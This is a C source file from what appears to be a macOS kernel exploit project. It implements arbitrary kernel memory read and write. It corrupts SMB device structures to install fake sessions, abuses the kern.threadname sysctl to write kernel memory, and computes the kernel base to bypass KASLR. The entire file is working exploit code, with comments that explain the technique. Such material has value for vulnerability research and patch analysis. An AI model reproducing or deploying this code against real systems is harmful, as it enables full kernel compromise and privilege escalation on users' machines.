//
//  kmem_ro.c
//  xe_kmem
//
//  Created by admin on 2/23/22.
//

#include <mach/thread_info.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_internal.h>
#include <xe/util/assert.h>
#include <xe/util/log.h>
#include <xe/util/ptrauth.h>
#include <macos/kernel.h>

#include "smb/client.h"
#include "smb/params.h"

#include "kmem_bootstrap.h"
#include "smb_dev_rw.h"
#include "kmem_read_session.h"
#include "kmem_write_session.h"


///
/// This module provides arbitary kernel memory read / write by using the `smb_dev_rw.c` to
/// obtain read / write access to `struct smb_dev` and then replacing their `dev->sd_session`
/// pointer value to fake session created by `kmem_read_session.c` or `kmem_write_session.c`.
///
/// In an ideal case we will have 2 active `smb_dev_rw` backends and we will configure one for
/// read and other for write. But sometimes `smb_dev_rw_create` method will only be able to obtain
/// read / write access to only one `struct smb_dev`. Also sometimes method `smb_dev_rw_write`
/// can fail, making that backend inactive. In these cases we will only have one active backend.
/// This module is implemented to handle this condition also
///


#define MAX_READ_SIZE 128 * 1024 * 1024
#define MAX_WRITE_SIZE 1024


typedef enum {
    /// Device configured for read
    DEV_READ,
    /// Device configured for write
    DEV_WRITE,
    /// Device not configured for read / write but can
    /// be configured
    DEV_USABLE,
    /// Device cannot be configured for read / write
    DEV_UNUSABLE,
} dev_config_t;


typedef struct bootstrap_dev {
    smb_dev_rw_t dev;
    dev_config_t config;
}* bootstrap_dev_t;


#define KMEM_BOOSTRAP_MAX_DEVS 2


struct kmem_bootstrap {
    int num_devs;
    bootstrap_dev_t devs;
    
    kmem_read_session_t read_session;
    kmem_write_session_t write_session;
    
    struct sockaddr_in smb_addr;
};


kmem_write_session_t kmem_bootstrap_get_write_session(struct kmem_bootstrap* kmem) {
    if (!kmem->write_session) {
        kmem->write_session = kmem_write_session_create(&kmem->smb_addr);
    }
    return kmem->write_session;
}


kmem_read_session_t kmem_boostrap_get_read_session(struct kmem_bootstrap* kmem) {
    if (!kmem->read_session) {
        kmem->read_session = kmem_read_session_create(&kmem->smb_addr);
    }
    return kmem->read_session;
}


int kmem_boostrap_setup_dev(struct kmem_bootstrap* kmem, bootstrap_dev_t dev, dev_config_t config) {
    /// For configuring a device for read / write, a fake smb session (`struct smb_session`)
    /// is created using `kmem_read_session` / `kmem_write_session`. Then the value of
    /// member `sd_session` of `struct smb_dev` is set to this fake session
    
    uintptr_t fake_session;
    switch (config) {
        case DEV_READ:
            fake_session = kmem_read_session_get_addr(kmem_boostrap_get_read_session(kmem));
            break;
        case DEV_WRITE:
            fake_session = kmem_write_session_get_addr(kmem_bootstrap_get_write_session(kmem));
            break;
        default:
            xe_log_error("invalid config %d", config);
            xe_abort();
    }
    
    struct smb_dev smb_dev;
    int error = smb_dev_rw_read(dev->dev, &smb_dev);
    xe_assert_err(error);
    
    smb_dev.sd_session = (struct smb_session*)fake_session;
    error = smb_dev_rw_write(dev->dev, &smb_dev);
    if (error) {
        xe_log_warn("write failed for smb_dev_rw with fd_dev: %d. smb_dev_rw will be deactivated", smb_dev_rw_get_dev_fd(dev->dev));
        dev->config = DEV_UNUSABLE;
        return error;
    } else {
        dev->config = config;
        return 0;
    }
}


bootstrap_dev_t kmem_bootstrap_get_dev(struct kmem_bootstrap* kmem, dev_config_t config) {
    xe_assert(config == DEV_READ || config == DEV_WRITE);
    
    /// If we have a bootstrap device configured for required config,
    /// use that
    for (int i=0; i<kmem->num_devs; i++) {
        bootstrap_dev_t dev = &kmem->devs[i];
        if (dev->config == config) {
            return dev;
        }
    }
    
    /// If we have a bootstrap device which is not configured for read /
    /// write but can be configured, use that
    for (int i=0; i<kmem->num_devs; i++) {
        bootstrap_dev_t dev = &kmem->devs[i];
        if (dev->config == DEV_USABLE) {
            int error = kmem_boostrap_setup_dev(kmem, dev, config);
            if (!error) {
                return dev;
            }
        }
    }
    
    /// Last resort, reconfigure a device for new config
    for (int i=0; i<kmem->num_devs; i++) {
        bootstrap_dev_t dev = &kmem->devs[i];
        if (dev->config != DEV_UNUSABLE) {
            int error = kmem_boostrap_setup_dev(kmem, dev, config);
            if (!error) {
                return dev;
            }
        }
    }
    
    xe_log_error("no smb_dev_rw left");
    xe_abort();
}

int kmem_boostrap_try_write(struct kmem_bootstrap* kmem, uintptr_t dst, const void* src, uint32_t size) {
    /// `kmem_write_session` writes data to arbitary kernel memory by setting the value of pointer
    /// `uth->pth_name` of current thread to `dst` and using sysctl `kern.threadname` to write
    /// data to `dst`. This sysctl is handled by `sysctl_handle_kern_threadname` method defined
    /// in `kern_sysctl.c`. This method will first use `bzero` to zero out 64 (MAXTHREADNAMESIZE)
    /// bytes of memory and then use `copyin` to copy data of upto 63 bytes from user land to
    /// `dst`. This means that we will be writing memory in blocks of size 64 bytes and last bytes
    /// of the written memory will always be zero
    ///
    /// So to write data with arbitary length, we first have convert them to blocks of size 64 bytes.
    /// The extra data required to fill up a block can be read from kernel memory.
    ///
    /// Since the last byte in a block should always be zero, we also need to make sure that the
    /// last byte in the last block written is actually required to be zero. If the data is `src` ends
    /// with zero, this can be easily done. When it is not ending with zero, we add more data to
    /// source buffer by reading from kernel memory until we can find a byte with value zero
    ///
    
    int block_size = MAXTHREADNAMESIZE;
    
    uintptr_t write_start = dst;
    uintptr_t write_end = dst + MAX(block_size, size);
    
    uint8_t last_byte;
    if (size >= block_size) {
        last_byte = ((char*)src)[size - 1];
    } else {
        last_byte = xe_kmem_read_uint8(write_end - 1, 0);
    }

    /// Find the write end position such that last byte is zero
    while (last_byte) {
        last_byte = xe_kmem_read_uint8(write_end++, 0);
    }
    
    size_t write_size = write_end - write_start;
    xe_assert_cond(write_size, >=, size);
    xe_assert_cond(write_size, >=, block_size);
    
    char* write_data = malloc(write_size);
    /// Data from `src`
    memcpy(write_data, src, size);
    /// Extra data read from kernel to satisfy block size and null byte requirements
    xe_kmem_read(write_data + size, write_start + size, 0, write_size - size);
    
    /// Make sure last byte is zero
    xe_assert_cond(write_data[write_size - 1], ==, '\0');
    
    /// No xe_kmem_read* after this point. Doing so may reconfigure the `dev`
    /// for read and write will fail
    bootstrap_dev_t dev = kmem_bootstrap_get_dev(kmem, DEV_WRITE);
    xe_assert(dev->config == DEV_WRITE);
    xe_assert_cond(smb_dev_rw_get_session(dev->dev), ==, kmem_write_session_get_addr(kmem->write_session));
    
    size_t cursor = 0;
    while (cursor < write_size) {
        /// Write data in block of size 64 bytes
        char block[MAXTHREADNAMESIZE];
        size_t end = cursor + sizeof(block);
        if (end < write_size) {
            memcpy(block, write_data + cursor, sizeof(block) - 1);
            /// Last byte of block should be 0
            block[sizeof(block) - 1] = '\0';
            /// Only 63 bytes was written from `write_data`
            end--;
        } else {
            /// Last block
            cursor = write_size - sizeof(block);
            /// Last byte in last block will always be zero
            memcpy(block, write_data + cursor, sizeof(block));
            xe_assert_cond(block[sizeof(block) - 1], ==, 0);
            end = write_size;
        }
        kmem_write_session_write_block(kmem->write_session, smb_dev_rw_get_dev_fd(dev->dev), dst + cursor, block);
        cursor = end;
    }
    
    free(write_data);
    return 0;
}


int kmem_boostrap_try_read(struct kmem_bootstrap* kmem, void* dst, uintptr_t src, uint32_t size) {
    bootstrap_dev_t dev = kmem_bootstrap_get_dev(kmem, DEV_READ);
    xe_assert(dev->config == DEV_READ);
    
    int fd = smb_dev_rw_get_dev_fd(dev->dev);
    
    int error = kmem_read_session_read(kmem->read_session, fd, dst, src, size);
    if (error == EINVAL) {
        /// Sometimes fake session created by `kmem_read_session` may have invalid main
        /// iod. See `kmem_read_session_build_iod` method in `kmem_read_session` for
        /// details. When the main iod is invalid, the `kmem_read_session_read` will return
        /// EINVAL. When this happens we mark the device as `USABLE` and invalidate the
        /// read session
        dev->config = DEV_USABLE;
        kmem_read_session_destroy(&kmem->read_session);
        kmem->read_session = NULL;
        return error;
    }
    xe_assert_err(error);
    return 0;
}


void kmem_bootstrap_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xe_assert_cond(size, <=, MAX_READ_SIZE);
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)ctx;
    int error;
    do {
        error = kmem_boostrap_try_read(kmem, dst, src, (uint32_t)size);
    } while (error != 0);
}


void kmem_bootstrap_write(void* ctx, uintptr_t dst, const void* src, size_t size) {
    xe_assert_cond(size, <=, MAX_WRITE_SIZE);
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)ctx;
    int error;
    do {
        error = kmem_boostrap_try_write(kmem, dst, src, (uint32_t)size);
    } while (error != 0);
}


static const struct xe_kmem_ops kmem_ro_ops = {
    .read = kmem_bootstrap_read,
    .write = kmem_bootstrap_write,
    .max_read_size = MAX_READ_SIZE,
    .max_write_size = MAX_WRITE_SIZE
};


xe_kmem_backend_t kmem_bootstrap_create(const struct sockaddr_in* smb_addr) {
    smb_dev_rw_t devs[2] = { NULL, NULL };
    
    /// Obtain read / write access to `struct smb_dev` allocated on kext.48 zone
    smb_dev_rw_create(smb_addr, devs);
    
    int dev_count = (devs[0] != NULL) + (devs[1] != NULL);
    xe_assert_cond(dev_count, >, 0);
    
    struct kmem_bootstrap* kmem = malloc(sizeof(struct kmem_bootstrap));
    kmem->smb_addr = *smb_addr;
    kmem->devs = malloc(sizeof(struct bootstrap_dev) * dev_count);
    for (int i=0; i<dev_count; i++) {
        kmem->devs[i].dev = devs[i];
        kmem->devs[i].config = smb_dev_rw_is_active(devs[i]) ? DEV_USABLE : DEV_UNUSABLE;
    }
    kmem->num_devs = dev_count;
    kmem->read_session = NULL;
    kmem->write_session = NULL;
    
    return xe_kmem_backend_create(&kmem_ro_ops, kmem);
}

uintptr_t kmem_bootstrap_get_mh_execute_header(xe_kmem_backend_t backend) {
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)xe_kmem_backend_get_ctx(backend);
    bootstrap_dev_t dev = NULL;
    
    for (int i=0; i<kmem->num_devs; i++) {
        if (kmem->devs[i].config != DEV_UNUSABLE) {
            dev = &kmem->devs[i];
            break;
        }
    }
    
    xe_assert(dev != NULL);
    
    struct smb_dev smb_dev;
    smb_dev_rw_read(dev->dev, &smb_dev);
    
    uintptr_t devfs = (uintptr_t)smb_dev.sd_devfs;
    uintptr_t de_dnp = xe_kmem_read_uint64(devfs, TYPE_DEVDIRENT_MEM_DE_DNP_OFFSET);
    uintptr_t dn_ops = xe_kmem_read_uint64(de_dnp, TYPE_DEVNODE_MEM_DN_OPS_OFFSET);
    uintptr_t vn_default_error = xe_ptrauth_strip(xe_kmem_read_uint64(xe_kmem_read_uint64(dn_ops, 0), 0));
    
    xe_assert_cond(vn_default_error, >=, FUNC_VN_DEFAULT_ERROR);
    uintptr_t text_exec_slide = vn_default_error - FUNC_VN_DEFAULT_ERROR;
    uintptr_t text_exec_base = XE_IMAGE_SEGMENT_TEXT_EXEC_BASE + text_exec_slide;
    uintptr_t text_base = text_exec_base - XE_IMAGE_SEGMENT_TEXT_SIZE;
    return text_base;
}

void kmem_bootstrap_destroy(xe_kmem_backend_t* backend_p) {
    struct kmem_bootstrap* kmem = xe_kmem_backend_get_ctx(*backend_p);
    for (int i=0; i<kmem->num_devs; i++) {
        smb_dev_rw_destroy(&kmem->devs[i].dev);
    }
    kmem_read_session_destroy(&kmem->read_session);
    kmem_write_session_destroy(&kmem->write_session);
    free(kmem->devs);
    free(kmem);
    xe_kmem_backend_destroy(backend_p);
}
